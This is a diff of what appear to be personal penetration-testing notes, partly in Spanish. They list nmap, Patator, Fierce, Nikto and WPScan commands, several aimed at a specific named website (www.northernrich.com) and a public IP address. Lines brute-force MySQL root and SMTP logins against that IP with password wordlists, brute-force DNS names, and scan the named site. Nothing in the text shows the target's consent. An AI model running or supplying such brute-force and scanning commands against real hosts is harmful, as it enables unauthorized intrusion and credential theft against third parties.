@@ -72,8 +72,8 @@ Por simplicidad, solo ejecuto los comandos core.
     sudo nmap -PN -sS -sV -oG northernrich-vulscan-site-script-all --script=all --script-args vulscancorrelation=1 www.northernrich.com
 
 # Web path scanner
-    dirsearch 
-    DirBuster
+    dirsearch -> TODO
+    DirBuster -> TODO
     Patator- password guessing attacks
 
     git clone https://github.com/lanjelot/patator.git /usr/share/patator
@@ -83,15 +83,14 @@ Por simplicidad, solo ejecuto los comandos core.
     sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt host=150.107.31.61 -x ignore:fgrep='Access denied for user'
     sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
     sudo patator mysql_login user=root password=FILE0 0=/usr/share/john/password.lst host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
-
     sudo patator smtp_login host=150.107.31.61 user=Ololena password=FILE0 0=/usr/share/john/password.lst
     sudo patator smtp_login host=150.107.31.61 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
-    patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
-    patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’
+    sudo patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+    sudo patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’
 
 # Use Fierce to brute DNS
 
-# Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server.
+# Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server. Esto tengo que ejecutarlo...
 
     # http://ha.ckers.org/fierce/
     ./fierce.pl -dns example.com
@@ -100,7 +99,8 @@ Por simplicidad, solo ejecuto los comandos core.
 # Use Nikto to scan Web services
 
     nikto -C all -h http://IP
-
+    nikto -C all -h 150.107.31.61
+    nikto -C all -h https://www.northernrich.com/en/
     WordPress scan
     git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
     ./wpscan –url http://IP/ –enumerate p
